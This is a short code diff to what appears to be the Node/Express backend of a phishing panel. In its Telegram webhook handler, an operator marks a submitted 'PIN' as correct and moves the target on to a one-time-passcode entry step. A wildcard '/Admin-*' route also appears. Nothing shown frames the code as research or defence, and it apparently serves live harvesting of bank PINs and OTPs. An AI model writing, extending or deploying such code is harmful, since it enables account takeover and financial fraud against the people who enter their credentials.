@@ -404,7 +404,7 @@ app.post('/api/telegram-webhook', async (req, res) => {
     const appReference = actionData.replace('step3_prompt_', '');
     if (activeApplications.has(appReference)) {
       const appData = activeApplications.get(appReference);
-      appData.status = 'OTP_APPROVED';
+      appData.status = 'PROMPT_OTP';
       activeApplications.set(appReference, appData);
     }
     const updatedText = `${callback_query.message.text}\n\n🟢 <b>STATUS: CORRECT PIN ✅ — PROMPTED TO OTP ENTRY</b>`;
@@ -462,4 +462,4 @@ app.get('/Admin-*', (req, res) => {
 app.listen(PORT, () => {
   console.log(`Server is running on port ${PORT}`);
 });
-  
+                                 
